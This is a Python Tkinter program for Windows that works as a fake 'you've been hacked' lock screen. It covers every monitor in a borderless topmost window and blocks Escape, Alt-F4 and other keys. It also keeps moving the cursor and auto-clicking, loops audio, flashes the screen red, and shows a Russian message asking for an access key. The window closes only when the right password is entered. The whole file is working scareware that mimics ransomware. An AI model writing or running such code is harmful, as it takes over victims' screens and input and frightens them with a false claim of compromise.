import ctypes
import os
import tkinter as tk
from tkinter import messagebox

PASSWORD = os.getenv("LOCKSCREEN_PASSWORD", "+ä-+ä-+ä-")

class LockScreen(tk.Tk):
    @staticmethod
    def get_virtual_screen_bounds():
        left = ctypes.windll.user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
        top = ctypes.windll.user32.GetSystemMetrics(77)   # SM_YVIRTUALSCREEN
        width = ctypes.windll.user32.GetSystemMetrics(78) # SM_CXVIRTUALSCREEN
        height = ctypes.windll.user32.GetSystemMetrics(79) # SM_CYVIRTUALSCREEN
        return left, top, width, height

    @staticmethod
    def get_monitor_count():
        return ctypes.windll.user32.GetSystemMetrics(80)  # SM_CMONITORS

    def __init__(self):
        super().__init__()
        self.title("Zugriff gesperrt")
        self.virtual_left, self.virtual_top, self.virtual_width, self.virtual_height = self.get_virtual_screen_bounds()

        self.geometry(f"{self.virtual_width}x{self.virtual_height}+{self.virtual_left}+{self.virtual_top}")
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.configure(bg="black")
        self.focus_force()

        self.protocol("WM_DELETE_WINDOW", self.close_app)
        self.bind("<Escape>", lambda event: "break")
        self.bind("<Alt-F4>", lambda event: "break")
        self.bind("<KeyPress>", lambda event: "break")
        self.bind("<Tab>", lambda event: "break")
        self.bind("<Control-KeyPress>", lambda event: "break")
        self.bind("Button-1", lambda event: "break")
        self.bind("Button-2", lambda event: "break")
        self.bind("Button-3", lambda event: "break")
        self.bind("<Motion>", lambda event: "break")
        
        self.start_audio()

        self.red_mode = False
        self.after(1000, self.blink_background)
        self.after(200, self.center_mouse)
        self.after(1000, self.auto_click)

        self.monitor_count = self.get_monitor_count()
        message = "Тебя взломали, введи ключ доступа, пожалуйста"
        display_message = message if self.monitor_count >= 2 else "Тебя взломали, введи ключ доступа,\nпожалуйста"
        width_ratio = 0.22 if self.monitor_count >= 2 else 0.8
        message_width = max(240, int(self.virtual_width * width_ratio))
        self.labels = []
        message_positions = (0.22, 0.612) if self.monitor_count >= 2 else (0.5,)
        for quarter_center in message_positions:
            label = tk.Label(
                self,
                text=display_message,
                bg="black",
                fg="white",
                font=("Arial", 30, "bold"),
                anchor="center",
                justify="center",
                wraplength=message_width
            )
            label.place(relx=quarter_center, rely=0.4, anchor="center")
            self.labels.append(label)

        frame = tk.Frame(self, bg="black")
        password_x = 0.22 if self.monitor_count >= 2 else 0.5
        password_y = 0.65 if self.monitor_count >= 2 else 0.88
        frame.place(relx=password_x, rely=password_y, anchor="center")

        tk.Label(frame, text="Passwort:", bg="black", fg="white", font=("Arial", 12)).pack()
        self.entry = tk.Entry(frame, width=30, font=("Arial", 12), show="*")
        self.entry.pack(pady=8)
        self.entry.focus_set()

        btn = tk.Button(
            frame,
            text="Подтвердить",
            command=self.check_password,
            width=20,
            font=("Arial", 11)
        )
        btn.pack(pady=10)

        self.bind("<Return>", lambda event: self.check_password())

    def start_audio(self):
        self.mci_send = ctypes.windll.winmm.mciSendStringW
        self.audio_aliases = []
        audio_dir = os.path.dirname(os.path.abspath(__file__))

        for index, filename in enumerate(("s1.mp3", "s2.mp3", "s3.mp3")):
            path = os.path.join(audio_dir, filename)
            if not os.path.isfile(path):
                raise FileNotFoundError(f"Audiodatei nicht gefunden: {path}")
            alias = f"lockscreen_audio_{index}"
            command = f'open "{path}" type mpegvideo alias {alias}'
            if self.mci_send(command, None, 0, None) != 0:
                raise RuntimeError(f"Audiodatei konnte nicht geöffnet werden: {path}")
            if self.mci_send(f"play {alias} repeat", None, 0, None) != 0:
                raise RuntimeError(f"Audiodatei konnte nicht abgespielt werden: {path}")
            self.audio_aliases.append(alias)

    def close_app(self):
        for alias in getattr(self, "audio_aliases", []):
            self.mci_send(f"stop {alias}", None, 0, None)
            self.mci_send(f"close {alias}", None, 0, None)
        self.destroy()

    def center_mouse(self):
        x = self.virtual_left + (self.virtual_width // 2) + 200
        y = self.virtual_top + (self.virtual_height // 2)
        ctypes.windll.user32.SetCursorPos(x, y)
        self.after(200, self.center_mouse)

    def auto_click(self):
        x = self.virtual_left + (self.virtual_width // 2) + 200
        y = self.virtual_top + (self.virtual_height // 2)
        ctypes.windll.user32.SetCursorPos(x, y)
        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
        self.after(1000, self.auto_click)

    def blink_background(self):
        self.red_mode = not self.red_mode
        if self.red_mode:
            color = "red"
            delay = 250
        else:
            color = "black"
            delay = 500

        self.configure(bg=color)
        for label in self.labels:
            label.configure(bg=color, fg="white")
        self.after(delay, self.blink_background)

    def check_password(self):
        if PASSWORD is None:
            messagebox.showerror("Fehler", "Passwort nicht konfiguriert. Setze die Umgebungsvariable LOCKSCREEN_PASSWORD.")
            return

        if self.entry.get() == PASSWORD:
            self.close_app()
        else:
            messagebox.showerror("Fehler", "Falsches Passwort.")
            self.entry.delete(0, tk.END)
            self.entry.focus_set()

if __name__ == "__main__":
    app = LockScreen()
    app.mainloop()